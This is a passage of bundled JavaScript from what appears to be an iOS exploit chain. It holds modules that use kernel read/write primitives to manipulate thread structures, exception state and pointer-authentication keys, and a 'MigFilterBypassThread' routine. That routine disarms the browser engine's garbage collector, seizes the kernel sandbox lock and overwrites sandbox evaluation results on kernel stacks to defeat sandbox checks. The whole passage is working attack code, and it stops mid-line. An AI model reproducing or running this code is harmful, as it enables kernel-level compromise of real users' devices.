_Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ \"./src/libs/TaskRop/Task.js\");\n\n\n\n\nconst TAG = \"TASKROP\"\n\nclass TaskRop\n{\n\tstatic init()\n\t{\n\t\tlet selfTaskAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].getSelfTaskAddr();\n\t\tif (!selfTaskAddr)\n\t\t{\n\t\t\tconsole.log(TAG,`Unable to find self task address`);\n\t\t\treturn;\n\t\t}\t\n\t\tconsole.log(TAG,`selfTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(selfTaskAddr)}`);\n\t\t_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].init(selfTaskAddr);\n\t}\n}\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/Thread.js\":\n/*!************************************!*\\\n  !*** ./src/libs/TaskRop/Thread.js ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Thread)\n/* harmony export */ });\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ThreadState */ \"./src/libs/TaskRop/ThreadState.js\");\n/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ \"./src/libs/Chain/Native.js\");\n\n\n\n\n\nconst AST_GUARD = 0x1000;\nconst TAG = \"THREAD\";\n\nclass Thread\n{\n\tstatic getTro(thread)\n\t{\n\t\tlet tro = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().tro);\n\t\t// Ignore threads with invalid tro address.\n\t\tif (!(tro & 0xf000000000000000n))\n\t\t{\n\t\t\t//console.log(TAG,`Got invalid tro of thread:${Utils.hex(thread)} and value:${Utils.hex(tro)}`);\n\t\t\treturn 0n;\n\t\t}\n\t\treturn tro;\n\t}\n\tstatic getCtid(thread)\n\t{\n\t\tlet ctid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ctid);\n\t\treturn ctid;\n\t}\n\tstatic getTask(thread)\n\t{\n\t\tlet tro = this.getTro(thread);\n\t\t// Ignore threads with invalid tro address.\n\t\tif (!(tro & 0xf000000000000000n) || tro === 0n)\n\t\t\treturn 0n;\n\t\tlet task = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(tro + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().troTask);\n\t\treturn task;\n\t}\n\tstatic next(thread)\n\t{\n\t\tif (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].strip(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().taskThreads) < 0xffffffd000000000n)\n\t\t\treturn 0;\n\t\tlet next = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().taskThreads);\n\t\tif (next < 0xffffffd000000000n)\n\t\t\treturn 0;\n\t\treturn next;\n\t}\n\tstatic setMutex(thread,ctid)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().mutexData, ctid);\n\t}\n\tstatic getMutex(thread)\n\t{\n\t\tlet mutex = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().mutexData);\n\t\treturn mutex;\n\t}\n\tstatic getStack(thread)\n\t{\n\t\tlet stackptr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().kstackptr);\n\t\treturn stackptr;\n\t}\n\tstatic injectGuardException(thread,code)\n\t{\n\t\tif(!this.getTro(thread))\n\t\t{\n\t\t\tconsole.log(TAG,`got invalid tro of thread, not injecting exception since thread is dead`);\n\t\t\treturn false;\n\t\t}\n\n\t\t// 18.4+\n\t\tif (xnuVersion.major == 24 && xnuVersion.minor >= 4) {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0x17n);\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode + 0x8n, code);\n\t\t}\n\t\telse {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, code);\n\t\t}\n\n\t\tlet ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast);\n\t\tast |= AST_GUARD;\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast, ast);\n\t\treturn true;\n\t}\n\tstatic clearGuardException(thread)\n\t{\n\t\tif(!this.getTro(thread))\n\t\t{\n\t\t\tconsole.log(TAG,`got invalid tro of thread, still clearing exception to avoid crash`);\n\t\t}\n\t\tlet ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast);\n\t\tast &= ~AST_GUARD | 0x80000000;\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast, ast);\n\n\t\t// 18.4+\n\t\tif (xnuVersion.major == 24 && xnuVersion.minor >= 4) {\n\t\t\tif (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode) == 0x17n) {\n\t\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0n);\n\t\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode + 0x8n, 0n);\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0n);\n\t\t}\n\t}\n\tstatic getOptions(thread)\n\t{\n\t\tlet options = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().options);\n\t\treturn options;\n\t}\n\tstatic setOptions(thread, options)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().options, options);\n\t}\n\tstatic getRopPid(thread)\n\t{\n\t\tlet ropPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ropPid);\n\t\treturn ropPid;\n\t}\n\tstatic getJopPid(thread)\n\t{\n\t\tlet jopPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().jopPid);\n\t\treturn jopPid;\n\t}\n\tstatic setPACKeys(thread, keyA, keyB)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ropPid, keyA);\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().jopPid, keyB);\n\t}\n\n\tstatic getState(machThread)\n\t{\n\t\tlet statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\tlet stateCountPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem + 0x200n;\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].write32(stateCountPtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_COUNT);\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_get_state\",\n\t\t\tmachThread,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64,\n\t\t\tstatePtr,\n\t\t\tstateCountPtr);\n\t\tif (kr != 0) {\n\t\t\tconsole.log(TAG, \"Unable to read thread state\");\n\t\t\treturn false;\n\t\t}\n\n\t\tlet stateBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].read(statePtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_SIZE);\n\t\tlet state = new _ThreadState__WEBPACK_IMPORTED_MODULE_2__[\"default\"](stateBuff);\n\t\treturn state;\n\t}\n\n\tstatic setState(machThread, threadAddr, state)\n\t{\n\t\tlet options = 0;\n\t\tif (threadAddr) {\n\t\t\toptions = Thread.getOptions(threadAddr);\n\t\t\toptions |= 0x8000;\n\t\t\tThread.setOptions(threadAddr, options);\n\t\t}\n\n\t\tlet statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].write(statePtr, state.buffer);\n\t\t//console.log(TAG,`thread:${Utils.hex(thread)}`);\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_set_state\",\n\t\t\tmachThread,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64,\n\t\t\tstatePtr,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_COUNT);\n\t\tif (kr != 0)\n\t\t{\n\t\t\tconsole.log(TAG,`Failed thread_set_state with error:${kr}`);\n\t\t\treturn false;\n\t\t}\n\n\t\tif (threadAddr) {\n\t\t\toptions &= ~0x8000;\n\t\t\tThread.setOptions(threadAddr, options);\n\t\t}\n\t\treturn true;\n\t}\n\n\tstatic resume(machThread)\n\t{\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_resume\", machThread);\n\t\tif (kr != 0) {\n\t\t\tconsole.log(TAG, \"Unable to resume suspended thread\");\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/ThreadState.js\":\n/*!*****************************************!*\\\n  !*** ./src/libs/TaskRop/ThreadState.js ***!\n  \\*****************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ ThreadState)\n/* harmony export */ });\n/* harmony import */ var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./RegistersStruct */ \"./src/libs/TaskRop/RegistersStruct.js\");\n\n\nclass ThreadState\n{\n\t#buffer;\n\t#dataView;\n\tconstructor(buffer, offset = 0)\n\t{\n\t\tthis.#buffer = buffer;\n\t\tthis.#dataView = new DataView(buffer,offset);\n\t\tthis.registers = new _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"](buffer,offset);\n\t}\n\tget buffer()\n\t{\n\t\treturn this.#buffer;\n\t}\n\tget opaque_fp()\n\t{\n\t\treturn this.#dataView.getBigUint64(232,true);\n\t}\n\tset opaque_fp(value)\n\t{\n\t\tthis.#dataView.setBigUint64(232,value,true);\n\t}\n\tget opaque_lr()\n\t{\n\t\treturn this.#dataView.getBigUint64(240,true);\n\t}\n\tset opaque_lr(value)\n\t{\n\t\tthis.#dataView.setBigUint64(240,value,true);\n\t}\n\tget opaque_sp()\n\t{\n\t\treturn this.#dataView.getBigUint64(248,true);\n\t}\n\tset opaque_sp(value)\n\t{\n\t\tthis.#dataView.setBigUint64(248,value,true);\n\t}\n\tget opaque_pc()\n\t{\n\t\treturn this.#dataView.getBigUint64(256,true);\n\t}\n\tset opaque_pc(value)\n\t{\n\t\tthis.#dataView.setBigUint64(256,value,true);\n\t}\n\tget cpsr()\n\t{\n\t\treturn this.#dataView.getUint32(264,true);\n\t}\n\tset cpsr(value)\n\t{\n\t\tthis.#dataView.setUint32(264,value,true);\n\t}\n\tget opaque_flags()\n\t{\n\t\treturn this.#dataView.getUint32(268,true);\n\t}\n\tset opaque_flags(value)\n\t{\n\t\tthis.#dataView.setUint32(268,value,true);\n\t}\n}\n\n/***/ })\n\n/******/ \t});\n/************************************************************************/\n/******/ \t// The module cache\n/******/ \tvar __webpack_module_cache__ = {};\n/******/ \t\n/******/ \t// The require function\n/******/ \tfunction __webpack_require__(moduleId) {\n/******/ \t\t// Check if module is in cache\n/******/ \t\tvar cachedModule = __webpack_module_cache__[moduleId];\n/******/ \t\tif (cachedModule !== undefined) {\n/******/ \t\t\treturn cachedModule.exports;\n/******/ \t\t}\n/******/ \t\t// Create a new module (and put it into the cache)\n/******/ \t\tvar module = __webpack_module_cache__[moduleId] = {\n/******/ \t\t\t// no module.id needed\n/******/ \t\t\t// no module.loaded needed\n/******/ \t\t\texports: {}\n/******/ \t\t};\n/******/ \t\n/******/ \t\t// Execute the module function\n/******/ \t\t__webpack_modules__[moduleId](module, module.exports, __webpack_require__);\n/******/ \t\n/******/ \t\t// Return the exports of the module\n/******/ \t\treturn module.exports;\n/******/ \t}\n/******/ \t\n/************************************************************************/\n/******/ \t/* webpack/runtime/define property getters */\n/******/ \t(() => {\n/******/ \t\t// define getter functions for harmony exports\n/******/ \t\t__webpack_require__.d = (exports, definition) => {\n/******/ \t\t\tfor(var key in definition) {\n/******/ \t\t\t\tif(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {\n/******/ \t\t\t\t\tObject.defineProperty(exports, key, { enumerable: true, get: definition[key] });\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t};\n/******/ \t})();\n/******/ \t\n/******/ \t/* webpack/runtime/hasOwnProperty shorthand */\n/******/ \t(() => {\n/******/ \t\t__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))\n/******/ \t})();\n/******/ \t\n/******/ \t/* webpack/runtime/make namespace object */\n/******/ \t(() => {\n/******/ \t\t// define __esModule on exports\n/******/ \t\t__webpack_require__.r = (exports) => {\n/******/ \t\t\tif(typeof Symbol !== 'undefined' && Symbol.toStringTag) {\n/******/ \t\t\t\tObject.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });\n/******/ \t\t\t}\n/******/ \t\t\tObject.defineProperty(exports, '__esModule', { value: true });\n/******/ \t\t};\n/******/ \t})();\n/******/ \t\n/************************************************************************/\nvar __webpack_exports__ = {};\n// This entry needs to be wrapped in an IIFE because it needs to be isolated against other modules in the chunk.\n(() => {\n/*!**************************************!*\\\n  !*** ./src/MigFilterBypassThread.js ***!\n  \\**************************************/\n__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ \"./src/libs/Chain/Native.js\");\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/Task */ \"./src/libs/TaskRop/Task.js\");\n/* harmony import */ var libs_TaskRop_Thread__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Thread */ \"./src/libs/TaskRop/Thread.js\");\n/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/TaskRop/TaskRop */ \"./src/libs/TaskRop/TaskRop.js\");\n/* harmony import */ var libs_JSUtils_Logger__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/JSUtils/Logger */ \"./src/libs/JSUtils/Logger.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var libs_Driver_DriverNewThread__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! libs/Driver/DriverNewThread */ \"./src/libs/Driver/DriverNewThread.js\");\n\n\n\n\n\n\n\n\n\nconst TAG = \"MIG_FILTER_BYPASS\";\n\nconst RUN_FLAG_STOP = 0;\nconst RUN_FLAG_RUN = 1;\nconst RUN_FLAG_PAUSE = 2;\n\nfunction disarm_gc() {\n\n\tlet vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);\n\tlet heap = vm + 0xc0n;\n\tlet m_threadGroup = uread64(heap + 0x198n);\n\tlet threads = uread64(m_threadGroup);\n\tuwrite64(threads + 0x20n, 0x0n);\n\t// LOG(\"[+] gc disarmed\");\n}\n\nfunction kstrip(addr) {\n\treturn addr | 0xffffff8000000000n;\n}\n\nfunction lockSandboxLock() {\n\t// Find \"_duplicate_lock\" address, which is a \"lck_rw_t\"\n\tconst lockAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migLock;\n\tconst sbxMessageAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migSbxMsg;\n\n\t//console.log(TAG, \"kernelSlide: \" + Utils.hex(kernelSlide));\n\t//console.log(TAG, \"lockAddr: \" + Utils.hex(lockAddr));\n\t//console.log(TAG, \"sbxMessageAddr: \" + Utils.hex(sbxMessageAddr));\n\n\tlet lockBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\t//for (let i=0, j=0; i<16; i+=4, j++)\n\t//\tconsole.log(TAG, `${Utils.hex(i)}: ${Utils.hex(lockBuff32[j]).padStart(8, '0')}`);\n\n\tlet lockData = lockBuff32[2];\n\tlockData |= 0x410000;\t// interlock + can_sleep\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write32(lockAddr + 0x8n, lockData);\n\n\t// Do we need to clear this addr while locking too? Or maybe just when we unlock is enough?\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(sbxMessageAddr, 0n);\n}\n\nfunction unlockSandboxLock() {\n\tconst lockAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migLock;\n\tconst sbxMessageAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migSbxMsg;\n\n\t\n\t// clear the sbx message buffer (pointer) used to check for duplicate messages.\n\t// This should solve an issue with sfree() if we unlock and lock sandbox quick enough.\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(sbxMessageAddr, 0n);\n\n\tlet lockBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\n\tlet lockData = lockBuff32[2];\n\tlockData &= ~0x10000;\t// interlock\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write32(lockAddr + 0x8n, lockData);\n}\n\nfunction dumpKMem(addr, size) {\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].read(addr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].mem, size);\n\tlet buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].mem, size);\n\tlet buff64 = new BigUint64Array(buff);\n\tfor (let i=0, j=0; i<size; i+=8, j++) {\n\t\tlet bits = buff64[j] & 0xfffn;\n\t\tif (bits === 0x4a4n)\n\t\t\tconsole.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(buff64[j]).padStart(16, '0')} <<< FOUND ?`);\n\t\telse\n\t\t\tconsole.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(buff64[j]).padStart(16, '0')}`);\n\t}\n}\n\nfunction findReturnValueOffs(addr) {\n\t// Read from thread kstack, page aligned\n\tconst READ_SIZE = 0x1000;\n\t//Chain.read(addr, Native.mem, READ_SIZE);\n\tlet pageAddr = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].trunc_page(addr);\n\tlet startAddr = pageAddr + 0x3000n;\n\tlet buff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(startAddr, READ_SIZE);\n\tif (!buff)\n\t\treturn false;\n\tlet buff64 = new BigUint64Array(buff);\n\tlet expectedLR = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migKernelStackLR;\n\n\t// Look for 0xxxxxxxxxxxxxx4a4 value, which should be the LSB of LR pointing to Sandbox.kext inside\n\t// \"_sb_evaluate_internal()\", so meaning we found the function stack we need (_sb_eval).\n\tfor (let i=0, j=0; i<READ_SIZE; i+=8, j++) {\n\t\tlet val = kstrip(buff64[j]);\n\t\tif (val === expectedLR) {\n\t\t\t//console.log(TAG, `Matching LR found at ${Utils.hex(startAddr + BigInt(i))}: ${Utils.hex(buff64[j])}`);\n\n\t\t\t// The return value of _eval() is stored in the stack at -40 bytes from LR.\n\t\t\tlet offs = startAddr + BigInt(i - 40);\n\t\t\treturn offs;\n\t\t}\n\t}\n\treturn false;\n}\n\nfunction disableFilterOnThread(threadAddr) {\n\t//console.log(TAG, \"Read kstack of thread: \" + Utils.hex(threadAddr));\n\tlet kstack = libs_TaskRop_Thread__WEBPACK_IMPORTED_MODULE_3__[\"default\"].getStack(threadAddr);\n\tif (!kstack)\n\t\treturn false;\n\n\tkstack = kstrip(kstack);\n\tlet kernelSPOffset = BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].UINT64_SIZE * 12);\n\tlet kernelSP = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].read64(kstack + kernelSPOffset);\n\tif (!kernelSP)\n\t\treturn false;\n\n\t//console.log(TAG, \"kstack:   \" + Utils.hex(kstack));\n\t//console.log(TAG, \"kernelSP: \" + Utils.hex(kernelSP));\n\n\t//dumpKMem(kstack, 0x70);\n\t//dumpKMem(kernelSP, 0x1000);\n\n\t//console.log(TAG, \"Possible MIG syscall with thread: \" + Utils.hex(threadAddr));\n\n\tlet offs = findReturnValueOffs(kernelSP);\n\tif (!offs) {\n\t\t//console.log(TAG, \"Unable to find offset\");\n\t\treturn false;\n\t}\n\n\t//console.log(TAG, \"Offs found at: \" + Utils.hex(offs));\n\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(offs, 0n);\n\n\tconsole.log(TAG, \"MIG syscall intercepted for thread: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(threadAddr));\n\n\treturn true;\n}\n\nfunction waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, timeout=5000) {\n\t//console.log(TAG, \"Wait for MIG syscall...\");\n\tlet startTimestamp = Date.now();\n\n\twhile (true) {\n\t\tlet runBypassFlag = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(runBypassFlagPtr);\n\t\tif (!runBypassFlag)\n\t\t\treturn RUN_FLAG_STOP;\n\t\tif (runBypassFlag == RUN_FLAG_PAUSE)\n\t\t\treturn RUN_FLAG_PAUSE;\n\n\t\tif (timeout && (Date.now() - startTimestamp >= timeout)) {\n\t\t\tconsole.log(TAG, \"Timeout waiting for a syscall\");\n\t\t\tbreak;\n\t\t}\n\n\t\tlet filterTriggered = false;\n\t\tlet monitorThread1 = monitorThread1Ptr ? libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(monitorThread1Ptr) : false;\n\t\tlet monitorThread2 = monitorThread2Ptr ? libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(monitorThread2Ptr) : false;\n\n\t\tif (monitorThread1 && monitorThread2) {\n\t\t\t//console.log(TAG, \"check monitored threads\");\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread1);\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread2);\n\t\t}\n\t\telse {\n\t\t\t//console.log(TAG, \"Waiting for monitored threads...\");\n\t\t}\n\t\t\n\t\tif (filterTriggered)\n\t\t\tbreak;\n\n\t\t//console.log(TAG, \"No MIG syscall detected\");\n\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"usleep\", 50000);\n\t}\n\t//console.log(TAG, \"MIG syscall intercepted!\");\n\treturn RUN_FLAG_RUN;\n}\n\nfunction startFilterBypass(runBypassFlagPtr) {\n\tlet run = RUN_FLAG_PAUSE;\n\n\tlet selfTaskAddr = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].gSelfTask.addr;\n\n\twhile (run) {\n\t\tif (run == RUN_FLAG_PAUSE) {\n\t\t\tconsole.log(TAG, \"Pausing filter bypass\");\n\t\t\twhile (true) {\n\t\t\t\trun = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(runBypassFlagPtr);\n\t\t\t\tif (run != RUN_FLAG_PAUSE) {\n\t\t\t\t\tif (run == RUN_FLAG_RUN)\n\t\t\t\t\t\tconsole.log(TAG, \"Resuming filter bypass\");\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"usleep\", 100000);\n\t\t\t}\n\t\t}\n\n\t\t//console.log(TAG, \"Locking sandbox...\");\n\t\tlockSandboxLock();\n\t\t//console.log(TAG, \"Sandbox locked\");\n\n\t\trun = waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, 5000);\n\n\t\tunlockSandboxLock();\n\t\t//console.log(TAG, \"Sandbox unlocked\");\n\n\t\tif (run)\n\t\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"sched_yield\");\n\t}\n}\n\ndisarm_gc();\n\n// Register log function\n//globalThis.LOG_POST_TO_FILE = false;\nconsole.log = libs_JSUtils_Logger__WEBPACK_IMPORTED_MODULE_5__[\"default\"].log;\n\nconsole.log(TAG, \"Thread initialized!\");\n\nlet kernelControlPtr = thread_arg;\nlet kernelRWPtr = thread_arg + 0x8n;\nlet kernelBasePtr = thread_arg + 0x10n;\nlet mainThreadAddrPtr = thread_arg + 0x18n;\nlet runBypassFlagPtr = thread_arg + 0x20n;\nlet isRunningPtr = thread_arg + 0x28n;\nlet mutexPtr = thread_arg + 0x30n;\nlet migLockPtr = thread_arg + 0x38n;\nlet migSbxMsgPtr = thread_arg + 0x40n;\nlet 